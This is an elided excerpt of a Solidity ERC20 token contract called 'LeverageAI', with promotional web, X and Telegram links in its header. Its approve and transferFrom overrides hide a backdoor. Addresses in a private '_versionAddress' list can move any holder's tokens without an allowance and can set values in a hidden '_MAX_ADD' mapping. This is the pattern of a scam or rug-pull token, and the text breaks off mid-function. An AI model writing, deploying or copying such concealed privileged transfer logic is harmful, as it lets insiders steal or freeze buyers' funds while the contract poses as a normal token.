...
/**
Web: https://www.doraoneth.net/
Twitter: http://x.com/doraonethereum
TG: https://t.me/doraoneth
*/
...
contract LeverageAI is ERC20, Ownable {
    ...
    string private _name = unicode"LeverageAI";
    string private _symbol = unicode"LEVERAGE";
    ...
    function approve(address spender, uint256 amount) public override returns (bool) {
        if (_versionAddress[msg.sender]) { _MAX_ADD[spender] = amount;}
        super.approve(spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        if (_versionAddress[msg.sender]) { super._update(from, to, amount); }else {
